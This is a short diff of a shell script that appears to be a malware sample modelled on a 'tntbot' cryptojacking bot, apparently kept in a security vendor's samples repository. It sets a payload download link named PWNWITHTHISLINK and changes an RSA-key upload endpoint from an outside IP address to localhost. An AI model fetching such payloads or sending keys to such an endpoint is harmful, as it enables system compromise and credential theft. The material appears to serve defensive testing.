@@ -13,7 +13,7 @@ exit
 fi
  
 PWNWITHTHISLINK="https://raw.githubusercontent.com/accuknox/samples/main/tntbot/Bot"
-RSAUPLOAD="http://152.67.166.153:8000"
+RSAUPLOAD="http://127.0.0.1:8080"
 setupmyapps(){
 	
 apt-get update --fix-missing 2>/dev/null 1>/dev/null
